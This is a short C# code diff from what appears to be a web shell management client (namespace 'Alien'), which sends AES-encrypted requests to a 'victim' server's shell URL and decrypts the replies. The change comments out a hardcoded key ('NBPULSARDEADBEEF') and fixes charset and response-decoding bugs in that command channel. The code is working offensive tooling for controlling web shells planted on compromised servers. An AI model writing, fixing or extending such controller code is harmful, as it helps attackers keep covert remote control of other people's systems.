@@ -797,7 +797,7 @@ namespace Alien
                 {
                     string szKey = m_victim.ShellPassword;
                     string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
-                    szHashKey = "NBPULSARDEADBEEF";
+                    //szHashKey = "NBPULSARDEADBEEF";
                     //MessageBox.Show(szHashKey);
                     byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
 
@@ -815,7 +815,7 @@ namespace Alien
                         {
                             content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                             {
-                                CharSet = "; charset=" + m_victim.ShellEncoding,
+                                CharSet = m_victim.ShellEncoding,
                             };
 
                             HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
@@ -853,7 +853,7 @@ namespace Alien
                         {
                             content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
                             {
-                                CharSet = "; charset=" + m_victim.ShellEncoding,
+                                CharSet = m_victim.ShellEncoding,
                             };
 
                             HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
@@ -862,7 +862,8 @@ namespace Alien
                             byte[] abEncResp = await resp.Content.ReadAsByteArrayAsync();
                             byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);
 
-                            string szResp = Encoding.UTF8.GetString(abResp);
+                            Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
+                            string szResp = encoding.GetString(abResp);
 
                             return szResp;
                         }
